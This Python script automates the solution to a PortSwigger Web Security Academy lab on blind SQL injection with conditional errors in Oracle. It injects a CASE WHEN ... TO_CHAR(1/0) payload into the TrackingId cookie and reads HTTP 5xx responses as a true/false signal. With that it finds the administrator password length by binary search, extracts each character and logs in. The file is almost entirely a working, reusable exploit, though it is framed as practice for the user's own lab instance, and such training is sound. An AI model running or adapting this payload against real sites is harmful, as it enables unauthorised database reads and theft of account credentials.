#!/usr/bin/env python3
"""
PortSwigger Web Security Academy — Lab 12
Blind SQL injection with conditional errors (Oracle)

Use only against your own PortSwigger Academy lab instance.

Example:
    python3 lab-12-blind-sqli-conditional-errors.py https://YOUR-LAB-ID.web-security-academy.net
    python3 lab-12-blind-sqli-conditional-errors.py https://YOUR-LAB-ID.web-security-academy.net -p 127.0.0.1:8080
"""

import argparse
import string
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def print_banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║ Lab 12 – Blind SQL Injection (Conditional Errors / Oracle)       ║
║ https://portswigger.net/web-security/sql-injection/blind/        ║
║                         lab-conditional-errors                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")


def build_proxies(proxy):
    if not proxy:
        return {}
    proxy_url = proxy if "://" in proxy else f"http://{proxy}"
    return {"http": proxy_url, "https": proxy_url}


def request_or_exit(method, url, *, proxies, **kwargs):
    try:
        return requests.request(
            method, url, proxies=proxies, verify=False, timeout=15, **kwargs
        )
    except requests.exceptions.ConnectionError:
        print(f"\n{RED}[✗] Connection failed. Is the lab URL correct and the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"\n{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)
    except requests.exceptions.RequestException as exc:
        print(f"\n{RED}[✗] Request failed: {exc}{RESET}")
        sys.exit(1)


def get_session(url, proxy=None):
    """Fetch the homepage and collect the lab's TrackingId and session cookies."""
    proxies = build_proxies(proxy)
    response = request_or_exit("GET", url, proxies=proxies)

    tracking_id = response.cookies.get("TrackingId")
    session_cookie = response.cookies.get("session")

    if not tracking_id:
        print(
            f"{RED}[✗] Could not find a TrackingId cookie in the response. "
            f"Open the lab URL first and confirm it is an active lab instance.{RESET}"
        )
        sys.exit(1)

    return tracking_id, session_cookie


def inject_condition(url, tracking_id, session_cookie, condition, proxy=None):
    """
    Trigger an Oracle error only when `condition` is true.

    Oracle payload shape:
      '||(SELECT CASE WHEN (condition)
        THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

    The lab's error response is used as the oracle: HTTP 5xx means the
    conditional divide-by-zero was triggered; a normal response means false.
    """
    proxies = build_proxies(proxy)
    payload = (
        "'||(SELECT CASE WHEN (" + condition +
        ") THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    )

    cookies = {"TrackingId": tracking_id + payload}
    if session_cookie:
        cookies["session"] = session_cookie

    response = request_or_exit("GET", url, proxies=proxies, cookies=cookies)
    return response.status_code >= 500


def confirm_oracle(url, tracking_id, session_cookie, proxy=None):
    print(f"{YELLOW}[*] Checking the conditional-error oracle...{RESET}")

    true_condition = inject_condition(
        url, tracking_id, session_cookie, "1=1", proxy
    )
    false_condition = inject_condition(
        url, tracking_id, session_cookie, "1=2", proxy
    )

    if true_condition and not false_condition:
        print(f"{GREEN}[✓] Conditional-error oracle confirmed (true → error, false → no error).{RESET}")
        return

    print(f"{RED}[✗] Could not confirm the expected error signal.{RESET}")
    print(
        f"{YELLOW}    Expected HTTP 5xx for 1=1 and a non-5xx response for 1=2.{RESET}\n"
        f"{YELLOW}    If you are using Burp, check the response status and adjust "
        f"is_error_response() if this lab instance signals errors differently.{RESET}"
    )
    sys.exit(1)


def is_error_response(status_code):
    """Central place to adapt detection if the lab returns a different error status."""
    return status_code >= 500


def find_password_length(url, tracking_id, session_cookie, proxy=None):
    """Binary-search the password length using conditional Oracle errors."""
    print(f"{YELLOW}[*] Determining administrator password length...{RESET}")

    # Lab passwords are short; expand this bound if needed.
    low, high = 1, 64

    # First ensure the upper bound is large enough.
    if inject_user_condition(
        url, tracking_id, session_cookie,
        f"LENGTH(password)>{high}", proxy
    ):
        print(f"{RED}[✗] Password length exceeds {high}; increase the upper bound in the script.{RESET}")
        sys.exit(1)

    while low < high:
        mid = (low + high) // 2
        has_error = inject_user_condition(
            url, tracking_id, session_cookie, f"LENGTH(password)>{mid}", proxy
        )
        if has_error:
            low = mid + 1
        else:
            high = mid

    if not inject_user_condition(
        url, tracking_id, session_cookie, f"LENGTH(password)={low}", proxy
    ):
        print(f"{RED}[✗] Could not verify password length. Check the response oracle.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[✓] Password length: {low}{RESET}")
    return low


def inject_user_condition(url, tracking_id, session_cookie, condition, proxy=None):
    """
    Evaluate a condition against the administrator row.
    This uses the lab's Oracle-specific CASE/TO_CHAR(1/0) technique.
    """
    proxies = build_proxies(proxy)
    payload = (
        "'||(SELECT CASE WHEN (" + condition +
        ") THEN TO_CHAR(1/0) ELSE '' END "
        "FROM users WHERE username='administrator' AND ROWNUM=1)||'"
    )

    cookies = {"TrackingId": tracking_id + payload}
    if session_cookie:
        cookies["session"] = session_cookie

    response = request_or_exit("GET", url, proxies=proxies, cookies=cookies)
    return is_error_response(response.status_code)


def extract_password(url, tracking_id, session_cookie, length, proxy=None):
    """Extract each password character using Oracle SUBSTR and conditional errors."""
    print(f"{YELLOW}[*] Extracting password ({length} characters)...{RESET}")

    charset = string.ascii_lowercase + string.digits
    password = ""

    for position in range(1, length + 1):
        found = False
        for char in charset:
            condition = f"SUBSTR(password,{position},1)='{char}'"
            if inject_user_condition(
                url, tracking_id, session_cookie, condition, proxy
            ):
                password += char
                sys.stdout.write(
                    f"\r{YELLOW}[*] Password: {GREEN}{password}"
                    f"{YELLOW}{'·' * (length - len(password))}{RESET}"
                )
                sys.stdout.flush()
                found = True
                break

        if not found:
            print(
                f"\n{RED}[✗] Could not determine the character at position "
                f"{position}. The lab password may use characters outside "
                f"lowercase letters and digits, or the error detector may need adjustment.{RESET}"
            )
            sys.exit(1)

    print(f"\n{GREEN}{BOLD}[✓] Password: {password}{RESET}")
    return password


def login(url, password, proxy=None):
    """Submit the administrator login form using a fresh requests session."""
    proxies = build_proxies(proxy)
    login_url = f"{url}/login"
    session = requests.Session()

    try:
        response = session.get(
            login_url, verify=False, proxies=proxies, timeout=15
        )
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Could not open login page: {exc}{RESET}")
        return

    csrf = None
    marker = 'name="csrf" value="'
    if marker in response.text:
        csrf = response.text.split(marker, 1)[1].split('"', 1)[0]

    data = {"username": "administrator", "password": password}
    if csrf:
        data["csrf"] = csrf

    try:
        response = session.post(
            login_url, data=data, verify=False, proxies=proxies, timeout=15
        )
    except requests.exceptions.RequestException as exc:
        print(f"{RED}[✗] Login request failed: {exc}{RESET}")
        return

    if "Your username is: administrator" in response.text or "Log out" in response.text:
        print(f"{GREEN}{BOLD}[✓] Login successful! Lab appears solved.{RESET}")
    else:
        print(
            f"{YELLOW}[*] Login submitted, but success was not confirmed automatically. "
            f"Check the lab page in your browser.{RESET}"
        )


def exploit(url, proxy=None):
    print(f"{YELLOW}[*] Target: {url}{RESET}")
    print(f"{YELLOW}[*] Proxy : {proxy if proxy else 'disabled'}{RESET}\n")

    tracking_id, session_cookie = get_session(url, proxy)
    print(f"{GREEN}[✓] TrackingId cookie acquired.{RESET}")

    confirm_oracle(url, tracking_id, session_cookie, proxy)

    # Confirm that the administrator row exists using a condition that
    # should trigger the error if that row exists.
    if not inject_user_condition(
        url, tracking_id, session_cookie, "1=1", proxy
    ):
        print(f"{RED}[✗] Could not confirm the administrator row exists.{RESET}")
        sys.exit(1)
    print(f"{GREEN}[✓] Administrator row confirmed.{RESET}")

    length = find_password_length(url, tracking_id, session_cookie, proxy)
    password = extract_password(
        url, tracking_id, session_cookie, length, proxy
    )

    print(f"\n{YELLOW}[*] Attempting administrator login...{RESET}")
    login(url, password, proxy)


def main():
    parser = argparse.ArgumentParser(
        description="PortSwigger Lab 12 — Blind SQL injection with conditional errors"
    )
    parser.add_argument(
        "url",
        help="Full URL of your active PortSwigger lab instance"
    )
    parser.add_argument(
        "-p", "--proxy", metavar="HOST:PORT",
        help="Optional HTTP proxy, e.g. 127.0.0.1:8080 (Burp Suite)"
    )
    args = parser.parse_args()

    url = args.url.rstrip("/")
    print_banner()
    exploit(url, proxy=args.proxy)


if __name__ == "__main__":
    main()
